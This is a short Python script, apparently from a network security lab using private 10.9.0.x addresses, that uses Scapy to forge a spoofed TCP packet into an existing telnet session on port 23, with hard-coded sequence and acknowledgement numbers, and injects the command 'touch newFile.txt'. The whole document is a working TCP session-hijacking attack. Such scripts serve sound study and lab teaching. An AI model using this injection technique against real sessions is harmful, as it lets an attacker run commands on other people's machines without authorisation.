#!/bin/env python3
from scapy.all import *
ip=IP(src="10.9.0.6 ",dst="10.9.0.5")
tcp=TCP(sport=51994, dport=23, flags="A", seq=1152222718, ack=421754619)
data="\rtouch newFile.txt\r"
pkt = ip/tcp/data
ls (pkt)
send (pkt, verbose=0)
